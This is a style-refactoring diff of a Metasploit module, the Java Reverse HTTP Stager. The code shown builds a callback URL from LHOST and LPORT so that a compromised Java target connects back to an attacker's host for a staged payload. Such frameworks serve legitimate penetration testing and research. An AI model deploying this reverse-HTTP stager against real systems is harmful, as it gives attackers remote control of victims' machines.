@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -7,7 +8,6 @@ require 'msf/core'
 require 'msf/core/handler/reverse_http'
 
 module MetasploitModule
-
   CachedSize = 5123
 
   include Msf::Payload::Stager
@@ -15,20 +15,19 @@ module MetasploitModule
 
   def initialize(info = {})
     super(merge_info(info,
-      'Name'          => 'Java Reverse HTTP Stager',
-      'Description'   => 'Tunnel communication over HTTP',
-      'Author'        => [
-          'mihi',  # all the hard work
-          'egypt', # msf integration
-          'hdm',   # windows/reverse_http
-        ],
-      'License'       => MSF_LICENSE,
-      'Platform'      => 'java',
-      'Arch'          => ARCH_JAVA,
-      'Handler'       => Msf::Handler::ReverseHttp,
-      'Convention'    => 'javaurl',
-      'Stager'        => {'Payload' => ""}
-      ))
+                     'Name'          => 'Java Reverse HTTP Stager',
+                     'Description'   => 'Tunnel communication over HTTP',
+                     'Author'        => [
+                       'mihi', # all the hard work
+                       'egypt', # msf integration
+                       'hdm',   # windows/reverse_http
+                     ],
+                     'License'       => MSF_LICENSE,
+                     'Platform'      => 'java',
+                     'Arch'          => ARCH_JAVA,
+                     'Handler'       => Msf::Handler::ReverseHttp,
+                     'Convention'    => 'javaurl',
+                     'Stager'        => { 'Payload' => "" }))
 
     register_advanced_options(
       [
@@ -44,16 +43,14 @@ module MetasploitModule
     uri_req_len = 30 + luri.length + rand(256 - (30 + luri.length))
 
     # Generate the short default URL if we don't know available space
-    if self.available_space.nil?
-      uri_req_len = 5
-    end
+    uri_req_len = 5 if available_space.nil?
 
     spawn = datastore["Spawn"] || 2
     c =  ""
     c << "Spawn=#{spawn}\n"
-    c << "URL=http://#{datastore["LHOST"]}"
-    c << ":#{datastore["LPORT"]}" if datastore["LPORT"]
-    c << "#{luri}"
+    c << "URL=http://#{datastore['LHOST']}"
+    c << ":#{datastore['LPORT']}" if datastore["LPORT"]
+    c << luri.to_s
     c << generate_uri_uuid_mode(:init_java, uri_req_len)
     c << "\n"
 
